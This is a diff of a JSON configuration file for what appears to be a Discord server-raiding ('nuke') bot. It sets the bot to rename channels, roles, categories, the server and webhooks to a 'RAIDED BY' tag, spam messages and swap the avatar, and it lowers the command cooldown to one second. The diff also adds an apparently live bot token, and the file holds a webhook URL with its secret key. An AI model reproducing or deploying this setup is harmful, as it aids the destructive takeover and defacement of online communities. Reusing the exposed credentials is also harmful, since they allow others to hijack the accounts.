@@ -1,17 +1,17 @@
 {
-	"token": "Token", 
-	"prefix": "!", "command_cooldown_time": 30, 
+	"token": "MTE4Mzk1NDM4NTk3MDE1NTU5Mw.Ge9xjB._Gg6CI5iweXph1sohuuxAqU4H-FWM9JkVkJ07Y", 
+	"prefix": "!", "command_cooldown_time": 1, 
 
 	"loghook": "https://discordapp.com/api/webhooks/1105189152628158585/0gU-A80873sYOhlcUUsZqJx39FaGXy6qzy4pjLuRp77ZChgtDtrTkl7QNuZrKYMvFAoM", 
 	"logs_output_type": "console/webhook", 
 
-	"nuke_channels_name": "crash3d-by-anarchy", 
-	"nuke_voice_name": "DDoS By Anarchy", 
-	"nuke_categories_name": "DDoS By Anarchy", 
-	"nuke_server_name": "...<<<CrAsH3D>>>...", 
-	"nuke_roles_name": "crash3d", 
-	"nuke_webhook_name": "CrAsH3D by Anarchy Syndicate", 
+	"nuke_channels_name": "╰•★★ 𝚁𝙰𝙸𝙳𝙴𝙳 𝙱𝚈 𝙹𝚇𝚀𝚄𝚇𝚂★★•╯", 
+	"nuke_voice_name": "╰•★★ 𝚁𝙰𝙸𝙳𝙴𝙳 𝙱𝚈 𝙹𝚇𝚀𝚄𝚇𝚂★★•╯", 
+	"nuke_categories_name": "╰•★★ 𝚁𝙰𝙸𝙳𝙴𝙳 𝙱𝚈 𝙹𝚇𝚀𝚄𝚇𝚂★★•╯", 
+	"nuke_server_name": "...<<<╰•★★ 𝚁𝙰𝙸𝙳𝙴𝙳 𝙱𝚈 𝙹𝚇𝚀𝚄𝚇𝚂★★•╯>>>...", 
+	"nuke_roles_name": "╰•★★ 𝚁𝙰𝙸𝙳𝙴𝙳 𝙱𝚈 𝙹𝚇𝚀𝚄𝚇𝚂★★•╯", 
+	"nuke_webhook_name": "╰•★★ 𝚁𝙰𝙸𝙳𝙴𝙳 𝙱𝚈 𝙹𝚇𝚀𝚄𝚇𝚂★★•╯", 
 
-	"nuke_avatar_file": "avatar.jpg", 
+	"nuke_avatar_file": "https://i.makeagif.com/media/4-26-2023/LsXhby.gif", 
 	"spam_text_file": "spam_text.txt"
 }
